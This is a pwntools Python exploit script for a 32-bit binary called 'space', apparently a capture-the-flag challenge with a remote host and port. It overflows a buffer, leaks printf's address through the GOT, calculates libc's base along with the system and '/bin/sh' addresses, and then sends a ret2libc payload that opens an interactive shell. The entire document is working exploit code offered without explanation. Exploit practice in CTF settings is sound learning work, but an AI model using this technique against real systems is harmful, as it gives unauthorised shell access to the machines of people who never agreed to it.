#!/usr/bin/env python
from pwn import *
from pprint import pprint

exe = context.binary = ELF('./space')
context.terminal = ['tmux', 'splitw', '-hb']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.SYMBOLS:
        log.info("Printing Symbols:")
        pprint(exe.symbols)
        exit(1)
    if args.REMOTE:
        return remote('134.209.16.184', 32569)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak *vuln+42
continue
'''.format(**locals())

offset = 18

io = start()
io.recvuntil("> ")

payload = [
    b"A" * offset,
    p32(exe.symbols['printf']),
    p32(exe.symbols['main']),
    p32(exe.got['printf'])
]

payload = b"".join(payload)

io.sendline(payload)

printf = u32(io.recv(4).strip())

log.info(f"leaked printf address: {hex(printf)}")

printf_offset = 0x053de0
system_offset = 0x045420
bin_sh_offset = 0x18f352

libc_addr = printf - printf_offset
log.info(f"Found libc Address: {hex(libc_addr)}")

system = libc_addr + system_offset
log.info(f"Calculated system address: {hex(system)}")
bin_sh = libc_addr + bin_sh_offset
log.info(f"Calculated /bin/sh address: {hex(bin_sh)}")

io.recvuntil("> ")

payload = [
    b"A"*offset,
    p32(system),
    p32(exe.symbols['main']),
    p32(bin_sh)
]

payload = b"".join(payload)

io.sendline(payload)

io.interactive()
